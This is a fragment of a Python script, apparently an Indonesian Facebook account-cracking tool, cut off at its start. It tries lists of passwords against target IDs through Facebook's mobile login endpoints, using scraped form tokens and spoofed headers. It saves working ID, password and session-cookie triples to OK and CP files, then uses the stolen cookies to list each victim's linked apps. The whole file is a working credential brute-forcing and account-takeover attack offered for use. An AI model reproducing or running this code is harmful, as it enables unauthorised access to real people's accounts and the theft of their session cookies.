'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			link = random.choice(["https://m.facebook.com/login/device-based/regular/login/?api_key=140810032656374&auth_token=63ed3e768f0e783f4cc81a6b1026c500&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D140810032656374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.pixiv.net%252Fpigya%252Fproxy%252Fcallback%252Ffacebook%26response_type%3Dcode%26scope%3Demail%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd3e7e4df-8e7b-42c9-81a7-ee0e2abb19c9%26tp%3Dunspecified&refsrc=deprecated&app_id=140810032656374&cancel=https%3A%2F%2Faccounts.pixiv.net%2Fpigya%2Fproxy%2Fcallback%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DGeDYUodE_pVN5pDXKBbhaF12RvXSU-30ikz4dZVHI8w%23_%3D_&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=7ade521eceaab1458866d9821149d64f&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fmobile.facebook.com%2Fv2.9%2Fdialog%2Foauth%3Fapp_id%3D213560439114%26cbt%3D1677182177996%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df11da1fc663793c%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%26client_id%3D213560439114%26display%3Dtouch%26domain%3Dwww.starmakerstudios.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Flogin%252Fpage%253Freturn_url%253D%252Finstrumental%252Fupload%26locale%3Dzh_CN%26logger_id%3Df2bda15588a0498%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df1931b4149a3a44%2526domain%253Dwww.starmakerstudios.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.starmakerstudios.com%25252Ff1245028efb5658%2526relation%253Dopener%2526frame%253Df3f39a10ef963dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv2.9%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1931b4149a3a44%26domain%3Dwww.starmakerstudios.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.starmakerstudios.com%252Ff1245028efb5658%26relation%3Dopener%26frame%3Df3f39a10ef963dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100&locale2=id_ID&refid=9","https://m.facebook.com/login/device-based/regular/login/?api_key=213560439114&auth_token=5f8c7178a13395b4cd272a3e1897de8b&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D213560439114%26cbt%3D1677419913361%26e2e%3D%257B%2522init%2522%253A1677419913361%257D%26ies%3D1%26sdk%3Dandroid-14.1.1%26sso%3Dchrome_custom_tab%26nonce%3D063978e3-28aa-4a0f-bbc6-9272a9973fcb%26scope%3Duser_birthday%252Copenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.starmakerinteractive.starmaker%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DP1LSLToQntEH2uBpWwB7VQimlXskVC9z-rHLt8TMxh0%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D81b4243d-16d4-4293-aa47-6359abf5abdd%26tp%3Dunspecified&refsrc=deprecated&app_id=213560439114&cancel=fbconnect%3A%2F%2Fcct.com.starmakerinteractive.starmaker%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252281b4243d-16d4-4293-aa47-6359abf5abdd%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522lgg1tdnv3jjnt4houtbf%2522%257D&lwv=100&locale2=id_ID&refid=9"])
			po = ses.post(link,data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
	
def crackmobile1(idf,pwv):
	bo = random.choice([m,k,h,b,u,x])
	global loop,ok,cp
	prog.update(des,description=f'\r{h}A1 {idf}{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]')
	prog.advance(des)
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=1169836009752131&kid_directed_site=0&app_id=1169836009752131&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.5%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26client_id%3D1169836009752131%26redirect_uri%3Dhttps%253A%252F%252Ftees.co.id%252F%26display%3Dpopup%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddf7a7932-3c56-46eb-8b8e-92236de08051%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftees.co.id%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'd5+gt97uzFsilGeOlLn7V7WTyVqH5NYXGvxL6rmEFhkXVZbptZ0pxbt4wCo7DtnVZZCUMJN9t6ExJK0RphG7kw==','content-length': '1700','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=1169836009752131&kid_directed_site=0&app_id=1169836009752131&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.5%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26client_id%3D1169836009752131%26redirect_uri%3Dhttps%253A%252F%252Ftees.co.id%252F%26display%3Dpopup%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddf7a7932-3c56-46eb-8b8e-92236de08051%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftees.co.id%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=1169836009752131&auth_token=44c741ad0cf77654d242b5d39b8cafbb&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv2.5%2Fdialog%2Foauth%3Fresponse_type%3Dtoken%26client_id%3D1169836009752131%26redirect_uri%3Dhttps%253A%252F%252Ftees.co.id%252F%26display%3Dpopup%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddf7a7932-3c56-46eb-8b8e-92236de08051%26tp%3Dunspecified&refsrc=deprecated&app_id=1169836009752131&cancel=https%3A%2F%2Ftees.co.id%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				kukis = kuki.replace(f'c_user={idf};datr','sb')
				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				cek_apk(kukis)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			waktu(31)
	loop+=1
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        â•°â”€ %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s\033[0m cookie invalid"%(M))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r%s    \033[0m        â•°â”€ %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s \033[0mcookie invalid"%(M))

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	login_baz()
